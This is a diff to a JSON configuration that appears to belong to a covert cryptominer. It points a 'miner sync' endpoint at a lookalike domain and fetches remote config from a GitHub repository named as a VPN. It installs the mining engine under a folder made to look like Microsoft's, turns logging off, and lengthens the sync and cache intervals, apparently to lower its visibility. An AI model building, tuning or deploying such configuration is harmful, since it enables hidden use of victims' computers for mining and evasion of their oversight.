@@ -3,7 +3,7 @@
     "PrimaryServer": "https://sync.controllpanellsync.site/api/miner/sync",
     "DiscoveryUrl": "https://raw.githubusercontent.com/auricore-stack/realtimevpn/refs/heads/main/sync_config.json",
     "DiscoveryEnabled": true,
-    "DiscoveryCacheMinutes": 10
+    "DiscoveryCacheMinutes": 30
   },
   "MinerConfig": {
     "EnginePath": "%LOCALAPPDATA%\\Microsoft\\AuriEngine\\AuriEngine.exe",
@@ -11,7 +11,7 @@
     "WorkingDirectory": "%LOCALAPPDATA%\\Microsoft\\AuriEngine"
   },
   "SystemConfig": {
-    "SyncIntervalSeconds": 5,
+    "SyncIntervalSeconds": 60,
     "MonitorIntervalMilliseconds": 1000,
     "EnableLogging": false
   },
